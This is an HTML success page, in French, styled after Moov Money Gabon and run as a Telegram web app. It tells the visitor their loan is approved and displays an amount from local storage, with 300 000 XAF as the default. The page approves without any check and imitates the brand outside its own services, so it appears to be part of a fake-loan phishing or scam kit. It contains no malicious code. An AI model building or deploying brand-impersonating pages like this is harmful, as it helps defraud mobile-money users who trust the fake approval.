<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Moov Money Gabon - Succès</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --moov-orange: #ff6600; --moov-blue: #0047ab; }
        body { background-color: var(--moov-orange); margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; font-family: sans-serif; }
        .card { background: white; width: 100%; max-width: 400px; border-radius: 24px; padding: 30px; text-align: center; }
        .check-circle { width: 80px; height: 80px; background: var(--moov-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 38px; margin: 0 auto 20px; }
        .home-btn { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-weight: 800; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
<div class="card">
    <div class="check-circle">✓</div>
    <h2>Félicitations !</h2>
    <p>Votre prêt a été <strong>approuvé !</strong></p>
    <h3 id="display-amount" style="color: var(--moov-blue); font-size: 28px;">300 000 XAF</h3>
    <button class="home-btn" onclick="location.href='/'">Retour à l'accueil</button>
</div>
<script>
    document.addEventListener("DOMContentLoaded", () => {
        const amt = localStorage.getItem('appliedAmount') || "300000";
        document.getElementById('display-amount').innerText = Number(amt).toLocaleString('fr-FR') + " XAF";
    });
</script>
</body>
</html>
